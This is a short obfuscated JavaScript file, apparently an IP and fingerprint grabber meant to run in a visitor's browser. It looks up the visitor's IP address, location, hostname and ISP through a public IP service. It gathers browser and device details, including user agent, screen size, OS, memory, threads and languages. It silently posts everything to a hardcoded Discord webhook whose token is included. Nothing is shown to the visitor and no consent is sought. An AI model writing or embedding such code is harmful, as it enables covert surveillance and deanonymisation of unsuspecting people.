fetch("https://wtfismyip.com/json").then(_0x4ec604 => _0x4ec604.json()).then(_0x1a542e => {
  let _0x5eb547 = {
    'Header': '',
    'IP': "\n```IPAddress: " + _0x1a542e.YourFuckingIPAddress,
    'Location': "\nLocation: " + _0x1a542e.YourFuckingLocation,
    'Hostname': "\nHostname: " + _0x1a542e.YourFuckingHostname,
    'ISP': "\nISP: " + _0x1a542e.YourFuckingISP,
    'City': "\nCity: " + _0x1a542e.YourFuckingCity,
    'country': "\nCountry: " + _0x1a542e.YourFuckingCountry,
    'countryCode': "\nCountry Code: " + _0x1a542e.YourFuckingCountryCode,
    'userAgent': "\nUser-agent: " + navigator.userAgent,
    'windowProp': "\nWindow Properties: " + Object.keys(window).length,
    'windowWidth': "\nWindow Width: " + window.innerWidth,
    'windowHeight': "\nWindow Height: " + window.innerHeight,
    'windowRatio': "\nWindow Ratio: " + window.innerWidth / window.innerHeight,
    'screenWidth': "\nScreen Width: " + window.screen.availWidth,
    'screenHeight': "\nScreen Height: " + window.screen.availHeight,
    'screenRatio': "\nScreen Ratio: " + window.screen.availWidth / window.screen.availHeight,
    'DPI': "\nDPI " + window.devicePixelRatio,
    'colorDepth': "\nColor Depth: " + window.screen.colorDepth,
    'orientation': "\nOrientation: " + window.screen.orientation.type,
    'orientationAngle': "\nOrientation Angle: " + window.screen.orientation.angle,
    'os': "\nOs: " + navigator.platform,
    'threads': "\nThreads: " + navigator.hardwareConcurrency,
    'memory': "\nMemory: " + navigator.deviceMemory,
    'systemLanguages': "\nSystem Language: " + navigator.languages.join(", "),
    'Languages': "\nLanguage: " + navigator.language + "```"
  };
  const _0x4e84b5 = {
    'embeds': [{
      'color': "000000",
      'title': '',
      'description': " " + _0x5eb547.IP + _0x5eb547.Location + _0x5eb547.country + _0x5eb547.City + _0x5eb547.Hostname + _0x5eb547.ISP + _0x5eb547.countryCode + _0x5eb547.userAgent + _0x5eb547.windowProp + _0x5eb547.windowRatio + _0x5eb547.windowWidth + _0x5eb547.windowHeight + _0x5eb547.screenRatio + _0x5eb547.screenWidth + _0x5eb547.screenHeight + _0x5eb547.DPI + _0x5eb547.colorDepth + _0x5eb547.orientationAngle + _0x5eb547.orientation + _0x5eb547.os + _0x5eb547.threads + _0x5eb547.memory + _0x5eb547.systemLanguages + _0x5eb547.Languages,
      'author': {
        'name': '',
        'url': "https://dualcorps.com",
        'icon_url': "https://cdn.discordapp.com/attachments/1122136554601717772/1123378621218820157/ico.png"
      },
      'footer': {
        'text': '',
        'icon_url': "https://cdn.discordapp.com/attachments/1122136554601717772/1123378621218820157/ico.png"
      }
    }]
  };
  fetch("https://discord.com/api/webhooks/1168497349295886406/y61qXZHFM-lxsLs3t-evi0CcGIryr9JSuGe_45l6SKtWNCFstWaCEugNlRESkeHdq36B", {
    'method': "POST",
    'headers': {
      'Content-Type': "application/json"
    },
    'body': JSON.stringify(_0x4e84b5)
  }).then(_0x53b800 => console.log(_0x53b800))["catch"](_0x56b63f => console.error(_0x56b63f));
})["catch"](_0x556576 => console.error(_0x556576));